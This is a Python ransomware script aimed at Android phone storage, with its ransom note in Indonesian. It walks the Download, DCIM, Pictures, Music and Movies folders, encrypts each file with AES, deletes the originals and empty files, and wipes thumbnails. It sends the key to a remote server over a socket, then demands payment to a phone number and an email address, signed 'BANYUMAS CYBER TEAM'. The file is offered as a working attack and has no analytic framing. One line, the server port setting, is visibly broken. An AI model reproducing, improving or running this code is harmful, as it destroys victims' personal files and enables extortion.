import os
import sys
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import binascii
import shutil
import socket

# Function to generate a random AES key
def generate_aes_key():
    return get_random_bytes(32)

# Function to encrypt a file
def encrypt_file(file_path, aes_key, encrypted_extension):
    try:
        # Check if the file size is empty
        if os.path.getsize(file_path) == 0:
            # Delete the file
            os.remove(file_path)

        # Check if the file size is less than 100Mb before encrypting
        elif os.path.getsize(file_path) < 100000000:
            # Prevent the file from re-encryption
            if file_path.endswith(encrypted_extension):
                return

            encrypted_file_path = file_path + encrypted_extension
            iv = get_random_bytes(16)
            cipher = AES.new(aes_key, AES.MODE_CFB, iv)

            with open(file_path, 'rb') as file:
                file_data = file.read()

            encrypted_data = cipher.encrypt(file_data)

            with open(encrypted_file_path, 'wb') as file:
                file.write(iv + encrypted_data)

            # Delete the file
            os.remove(file_path)

    except Exception as e:
        pass

# Function to decrypt a file
def decrypt_file(file_path, aes_key, encrypted_extension):
    try:
        # Check if the file has the expected encrypted extension before decrypting
        if not file_path.endswith(encrypted_extension):
            return

        with open(file_path, 'rb') as file:
            file_data = file.read()

        iv = file_data[:16]
        ciphertext = file_data[16:]
        cipher = AES.new(aes_key, AES.MODE_CFB, iv)
        decrypted_data = cipher.decrypt(ciphertext)
        decrypted_file_path = file_path[:-len(encrypted_extension)]

        with open(decrypted_file_path, 'wb') as file:
            file.write(decrypted_data)

        # Delete the file
        os.remove(file_path)

    except Exception as e:
        pass

# Function to process all files in a directory
def process_directory(directory_path, aes_key, encrypted_extension, status):
    for root, _, files in os.walk(directory_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if status == "e":
                encrypt_file(file_path, aes_key, encrypted_extension)
            elif status == "d":
                decrypt_file(file_path, aes_key, encrypted_extension)

# Function to process all storage directories
def process_all_storage_and_sdcard(aes_key, encrypted_extension, status):
    storage_directories = ["/storage/emulated/0", "/storage/emulated/10"]  # Add more storage paths if needed

    for directory in storage_directories:
        # Check if "Download" folder exists
        if os.path.exists(os.path.join(directory, "Download")):
            # Process the "Download" folder
            process_directory(os.path.join(directory, "Download"), aes_key, encrypted_extension, status)

        # Check if "downloads" folder exists
        if os.path.exists(os.path.join(directory, "downloads")):
            # Process the "downloads" folder
            process_directory(os.path.join(directory, "downloads"), aes_key, encrypted_extension, status)

        # Check if "Pictures" folder exists
        if os.path.exists(os.path.join(directory, "Pictures")):
            # Process the "Pictures" folder
            process_directory(os.path.join(directory, "Pictures"), aes_key, encrypted_extension, status)

        # Check if "DCIM" folder exists
        if os.path.exists(os.path.join(directory, "DCIM")):
            # Process the "DCIM" folder
            process_directory(os.path.join(directory, "DCIM"), aes_key, encrypted_extension, status)

        # Check if "Music" folder exists
        if os.path.exists(os.path.join(directory, "Music")):
            # Process the "Music" folder
            process_directory(os.path.join(directory, "Music"), aes_key, encrypted_extension, status)

        # Check if "Movies" folder exists
        if os.path.exists(os.path.join(directory, "Movies")):
            # Process the "Movies" folder
            process_directory(os.path.join(directory, "Movies"), aes_key, encrypted_extension, status)

        # Check if "Fonts" folder exists
        if os.path.exists(os.path.join(directory, "Fonts")):
            # Process the "Fonts" folder
            process_directory(os.path.join(directory, "Fonts"), aes_key, encrypted_extension, status)

        # Check if the root directory folder exists
        if os.path.exists(directory):
            # Process the entire storage
            process_directory(directory, aes_key, encrypted_extension, status)


if __name__ == "__main__":
    # Configure the client
    SERVER_IP = '192.168.1.6'  # Replace with the public IP of the server
    SERVER_PORT = '192.168.1.1                # Port to connect to

    encrypted_extension = ".locked"  # Change this if you want a different extension
    aes_key = generate_aes_key()
    aes_key_hex = binascii.hexlify(aes_key).decode('utf-8')
    status = "e"  # encrypt

    try:
        # Create a socket
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the server
        client_socket.connect((SERVER_IP, SERVER_PORT))

        # Send data to the server
        client_socket.send(aes_key_hex.encode('utf-8'))

        # Receive and print the server's response
        data = client_socket.recv(1024)
        print(f"{data.decode('utf-8')}")
        client_socket.close()
    except Exception as e:
        # If there's an error sending the key, terminate the script
        sys.exit(1)

    # Define the path to the thumbnails folder
    dcim_path = "/storage/emulated/0/DCIM"
    thumbnail_path = os.path.join(dcim_path, ".thumbnails")

    # Check if the thumbnails folder exists
    if os.path.exists(thumbnail_path) and os.path.isdir(thumbnail_path):
        try:
            # Use shutil.rmtree to delete the thumbnails folder and its contents
            shutil.rmtree(thumbnail_path)

        except Exception as e:
            pass

    process_all_storage_and_sdcard(aes_key, encrypted_extension, status)
    os.system("clear")
    message = f"""
                      \033[91m.-""-.\033[0m
                     \033[91m/ .--. \\\033[0m
                    \033[91m/ /   \\\ \\\033[0m
                    \033[91m| |    | |\033[0m
                    \033[91m| |.-""-.| \033[0m
                   \033[91m///`.::::.`\\\033[0m
                  \033[91m||| ::/  \\:: ;\033[0m
                  \033[91m||; ::\\__/:: ;\033[0m
                   \033[91m\\\\\\ '::::' /\033[0m
                    \033[91m`=':-..-'`\033[0m
      \033[91mERROR\033[0m: YOUR FILES HAS BEEN \033[91mENCRYPTED\033[0m!
''

Dokumen pribadi, foto, dan berkas Anda lainnya di perangkat ini dienkripsi menggunakan algoritma AES-256.
Berkas asli telah dihapus sepenuhnya dan hanya dapat dipulihkan dengan mengikuti langkah-langkah yang dijelaskan di bawah ini.

1. 1. Untuk mendapatkan kunci yang akan mendekripsi berkas, Anda perlu membayar 500Ribu Dana Ke Nomer Tersebut :
    >> \033[93m085883413634\033[0m <<

2. 2. Setelah pembayaran selesai, hubungi kami di \033[96mjoki35232@gmail.com\033[0m dan kirimkan Bukti Transaksi atau tangkapan layar pembayaran Anda, dan kami akan memberikan kuncinya.


    \033[91mPERHATIAN PENTING :\033[0m

\033[91m[!]\033[0m Jangan mengganti nama atau mengubah berkas yang terenkripsi.
\033[91m[!]\033[0m Jangan matikan atau mulai ulang perangkat Anda atau tutup aplikasi ini karena Anda tidak akan pernah bisa memulihkan berkas Anda.
\033[91m[!]\033[0m Jangan masukkan kunci apa pun, kami tidak bertanggung jawab atas tindakan Anda sendiri.
\033[91m[!]\033[0m BANYUMAS CYBER TEAM


    """

    print(message)
    aes_key_hex = input("KEY: ")
    aes_key = binascii.unhexlify(aes_key_hex)
    status = "d"  # decrypt
    os.system("clear")
    print("\033[91mINPUT KUNCI SALAH, FILE ANDA AKAN RUSAK KARENA KAMI SUDAH MENDEKRIPSI FILE ANDA!\033[0m")
    process_all_storage_and_sdcard(aes_key, encrypted_extension, status)